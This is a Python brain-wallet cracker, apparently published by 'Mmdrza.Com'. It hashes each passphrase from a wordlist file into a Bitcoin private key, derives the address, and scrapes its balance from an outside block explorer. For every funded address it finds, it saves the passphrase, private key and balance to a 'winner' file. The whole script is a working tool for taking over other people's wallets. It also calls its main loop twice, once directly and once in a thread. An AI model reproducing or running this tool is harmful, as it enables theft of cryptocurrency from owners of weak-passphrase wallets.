#  ███╗    ███╗   ███╗███╗   ███╗██████╗ ██████╗ ███████╗ █████╗     ██████╗ ██████╗ ███╗   ███╗    ███╗ #
#  ██╔╝    ████╗ ████║████╗ ████║██╔══██╗██╔══██╗╚══███╔╝██╔══██╗   ██╔════╝██╔═══██╗████╗ ████║    ╚██║ #
#  ██║     ██╔████╔██║██╔████╔██║██║  ██║██████╔╝  ███╔╝ ███████║   ██║     ██║   ██║██╔████╔██║     ██║ #
#  ██║     ██║╚██╔╝██║██║╚██╔╝██║██║  ██║██╔══██╗ ███╔╝  ██╔══██║   ██║     ██║   ██║██║╚██╔╝██║     ██║ #
#  ███╗    ██║ ╚═╝ ██║██║ ╚═╝ ██║██████╔╝██║  ██║███████╗██║  ██║██╗╚██████╗╚██████╔╝██║ ╚═╝ ██║    ███║ #
#  ╚══╝    ╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝    ╚══╝ #
#   Programmer Mmdrza.Com ~ Telegram Channel @mPython3 ~ ID Telegram @PyMmdrza ~ https://Mmdrza.Com      #
##########################################################################################################


import codecs
import hashlib
import threading

import ecdsa
import requests
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from lxml import html
from rich.console import Console
from rich.panel import Panel

console = Console()
console.clear()

filexname = input('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n [*] INSERT HERE File Name <---------|Without type file .txt|:::::::: ')

mylist = []

filename = str(filexname + ".txt")
with open(filename, newline='', encoding='utf-8') as f:
	for line in f:
		mylist.append(line.strip())


class BrainWallet:
	
	@staticmethod
	def generate_address_from_passphrase(passphrase):
		private_key = str(hashlib.sha256(
			passphrase.encode('utf-8')).hexdigest())
		address = BrainWallet.generate_address_from_private_key(private_key)
		return private_key, address
	
	@staticmethod
	def generate_address_from_private_key(private_key):
		public_key = BrainWallet.__private_to_public(private_key)
		address = BrainWallet.__public_to_address(public_key)
		return address
	
	@staticmethod
	def __private_to_public(private_key):
		private_key_bytes = codecs.decode(private_key, 'hex')
		key = ecdsa.SigningKey.from_string(
			private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
		key_bytes = key.to_string()
		key_hex = codecs.encode(key_bytes, 'hex')
		bitcoin_byte = b'04'
		public_key = bitcoin_byte + key_hex
		return public_key
	
	@staticmethod
	def __public_to_address(public_key):
		public_key_bytes = codecs.decode(public_key, 'hex')
		# Run SHA256 for the public key
		sha256_bpk = hashlib.sha256(public_key_bytes)
		sha256_bpk_digest = sha256_bpk.digest()
		ripemd160_bpk = hashlib.new('ripemd160')
		ripemd160_bpk.update(sha256_bpk_digest)
		ripemd160_bpk_digest = ripemd160_bpk.digest()
		ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
		network_byte = b'00'
		network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
		network_bitcoin_public_key_bytes = codecs.decode(
			network_bitcoin_public_key, 'hex')
		sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
		sha256_nbpk_digest = sha256_nbpk.digest()
		sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
		sha256_2_nbpk_digest = sha256_2_nbpk.digest()
		sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
		checksum = sha256_2_hex[:8]
		address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
		wallet = BrainWallet.base58(address_hex)
		return wallet
	
	@staticmethod
	def base58(address_hex):
		alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
		b58_string = ''
		leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
		address_int = int(address_hex, 16)
		while address_int > 0:
			digit = address_int % 58
			digit_char = alphabet[digit]
			b58_string = digit_char + b58_string
			address_int //= 58
		ones = leading_zeros // 2
		for one in range(ones):
			b58_string = '1' + b58_string
		return b58_string


def balb(addr):
	urlblock = "https://bitcoin.atomicwallet.io/address/" + addr
	respone_block = requests.get(urlblock)
	byte_string = respone_block.content
	source_code = html.fromstring(byte_string)
	xpatch_txid = '//*[@id="wrap"]/div/div[2]/div[1]/table/tbody/tr[3]/td[2]'
	treetxid = source_code.xpath(xpatch_txid)
	xVol = str(treetxid[0].text_content())
	return xVol


def MmDrza():
	w = 0
	count = 0
	
	for i in range(0, len(mylist)):
		count += 1
		passphrase = mylist[i]
		wallet = BrainWallet()
		private_key, address = wallet.generate_address_from_passphrase(passphrase)
		hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
		hdwallet.from_private_key(private_key=private_key)
		addr = hdwallet.p2pkh_address()
		bal = balb(addr)
		ifxbtc = '0 BTC'
		MmdrzaPanel = str('[gold1 on grey15]Total Checked: ' + '[orange_red1]' + str(count) + '[/][gold1 on grey15] ' + ' Win:' + '[white]' + str(w) + '[/][gold1]  BAL:[aquamarine1]' + str(bal) + '\n[/][gold1 on grey15]Addr: ' + '[white] ' + str(address) + '[gold1 on grey15]                  Passphrase: ' + '[orange_red1]' + str(passphrase) + '[/]\nPRIVATEKEY: [grey54]' + str(private_key) + '[/]')
		style = "gold1 on grey11"
		if bal != ifxbtc:
			fx = open(u"BitcoinWinner_________" + str(filexname) + "_MMDRZA.txt", "a", encoding="utf-8")
			fx.write('\nAddress Compressed : ' + addr + '  Bal = ' + str(bal))
			fx.write('\nPassphrase       : ' + passphrase)
			fx.write('\nPrivate Key      : ' + private_key)
			fx.write('\nBalance: ' + str(bal))
			fx.write('\n------------------ Programmer Mmdrza.Com ----------------------\n')
			fx.close()
			console.print(Panel(str(MmdrzaPanel), title="[white]Win Wallet [/]", subtitle="[green_yellow blink] Mmdrza.Com [/]", style="red"), style=style, justify="full")
			w += 1
		else:
			console.print('[gold1]Total:[white]' + str(count) + '[/][gold1]-- Win:[white]' + str(w) + '[/][b red1] Bitcoin [magenta2]P2PKH [/]:[gold1] ' + addr + ' [khaki1] --[wheat1]-[cornsilk1]-[cornsilk1]-[wheat1]-[wheat1]-[khaki1]-[light_goldenrod1] B[yellow1]AL[yellow1]A[yellow2]N[yellow3]C[gold1]E: [orange3]' + str(bal) + '[/][yellow]  Passphrase:[green]' + str(passphrase) + '[/]')
			continue


MmDrza()

t = threading.Thread(target=MmDrza)
t.start()
t.join()
